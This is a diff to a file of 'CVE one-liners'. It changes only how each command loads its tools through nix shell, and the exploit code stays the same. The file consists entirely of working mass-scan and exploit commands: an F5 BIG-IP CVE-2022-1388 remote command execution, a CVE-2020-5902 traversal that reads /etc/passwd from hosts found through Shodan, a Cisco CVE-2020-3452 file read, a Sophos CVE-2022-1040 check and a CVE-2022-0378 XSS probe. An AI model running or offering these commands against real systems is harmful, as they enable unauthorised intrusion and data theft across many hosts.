@@ -1,16 +1,16 @@
 % CVE one-liners
 
 # Sophos Firewall CVE-2022-1040 (RCE)
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"👽":"TEST"\}" | grep -q 'Session Expired' && printf "$host \033[1;41mVulnerable a CVE-2022-1040 (Sophos RCE)\e[0m\n"; done;
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ coreutils ]' -c cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"👽":"TEST"\}" | grep -q 'Session Expired' && printf "$host \033[1;41mVulnerable a CVE-2022-1040 (Sophos RCE)\e[0m\n"; done;
 
 # Exploit F5 Big IP  Using Curl - CVE-2022-1388
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ coreutils ]' -c cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
 
 # CVE-2020-5902
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#python3Packages.shodan -c shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ python3Packages.shodan ]' -c shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
 
 # CVE-2020-3452
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
 
 # CVE-2022-0378
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ coreutils ]' -c cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
